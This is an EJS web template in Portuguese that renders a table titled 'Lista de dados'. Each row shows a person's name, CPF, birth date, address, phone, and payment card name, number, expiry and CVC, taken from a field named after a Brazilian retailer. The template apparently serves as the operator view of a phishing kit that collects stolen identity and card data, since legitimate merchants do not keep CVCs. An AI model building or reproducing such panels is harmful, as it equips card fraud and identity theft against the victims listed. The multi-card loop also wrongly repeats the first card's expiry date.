<%
    function pad(d) {
        return (d < 10) ? '0' + d.toString() : d.toString();
    }
%>

<div class="row">
    <%- include('../errors/messages.ejs') %>
    <div class="col-md-12 justify-content-center bg-dark py-4 rounded">
        <div class="col-md-12 justify-content-center text-uppercase mx-auto text-center bg-primary text-light rounded-lg py-4 mb-4">
            Lista de dados
        </div>
        <div class="row table-responsive justify-content-center mx-auto ">
            <table class="table text-center table-hover table-striped">
                <thead>
                    <tr>
                        <th colspan="7">
                            Dados
                        </th>
                        <th colspan="4">
                            Cartões
                        </th>
                    </tr>
                    <tr>
                        <th>Nome</th>
                        <th>CPF</th>
                        <th>Data de nascimento</th>
                        <th>Endereço</th>
                        <th>Referência</th>
                        <th>CEP</th>
                        <th>Telefone</th>

                        <th>Nome do cartão</th>
                        <th>Número do cartão</th>
                        <th>Validade</th>
                        <th>CVC</th>
                    </tr>
                </thead>
                <tbody>
                    <% for (let i = 0; data.length > i; i++) { %>
                        <tr>
                            <td><%= data[i].full_name %></td>
                            <td><%= data[i].cpf %></td>
                            <td><%= data[i].birth_date %></td>
                            <td><%= `${data[i].address}, ${data[i].number} - ${data[i].neighbourhood} - ${data[i].city}/${data[i].state}` %></td>
                            <td><%= data[i].complement %></td>
                            <td><%= data[i].zipcode %></td>
                            <td><%= data[i].telephone %></td>
                            <% if (Object.keys(data[i].magalu_infos).length === 1) { %>
                                <td><%= data[i].magalu_infos[0].cardname %></td>
                                <td><%= data[i].magalu_infos[0].cardnumber %></td>
                                <td><%= `${pad(data[i].magalu_infos[0].expiration_month)}/${data[i].magalu_infos[0].expiration_year}` %></td>
                                <td><%= data[i].magalu_infos[0].cvc %></td>
                            <% } else if (Object.keys(data[i].magalu_infos).length > 1) { %>
                                <% let cardname = '' %>
                                <% let cardnumber = '' %>
                                <% let expiration = '' %>
                                <% let cvc = '' %>
                                <% for (let j = 0; j < Object.keys(data[i].magalu_infos).length; j++) { %>
                                    <% cardname += data[i].magalu_infos[j].cardname + ' || ' %>
                                    <% cardnumber += data[i].magalu_infos[j].cardnumber + ' || ' %>
                                    <% expiration += `${pad(data[i].magalu_infos[0].expiration_month)}/${data[i].magalu_infos[0].expiration_year}` + ' || ' %>
                                    <% cvc += data[i].magalu_infos[j].cvc + ' || ' %>
                                <% } %>
                                <td><%= cardname %></td>
                                <td><%= cardnumber %></td>
                                <td><%= expiration %></td>
                                <td><%= cvc %></td>
                            <% } else { %>
                                <td></td>
                                <td></td>
                                <td></td>
                                <td></td>
                            <% } %>
                        </tr>
                    <% } %>
                </tbody>
            </table>
        </div>
    </div>
</div>